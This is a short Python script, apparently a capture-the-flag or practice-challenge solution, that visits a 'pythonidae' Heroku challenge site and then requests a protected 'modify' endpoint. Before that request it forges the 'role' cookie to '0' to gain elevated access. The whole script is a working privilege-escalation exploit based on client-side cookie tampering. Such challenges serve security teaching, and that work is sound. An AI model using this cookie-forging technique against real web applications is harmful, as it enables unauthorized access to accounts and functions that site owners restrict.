import requests

URL = "https://pythonidae.herokuapp.com/web/cookies"
URL2 = "https://pythonidae.herokuapp.com/web-api/modify"

session = requests.Session()
session.get(url=URL, headers={'User-Agent': 'pythonidae'})
session.cookies.set('role', '0')
req = session.get(url=URL2)
print(req)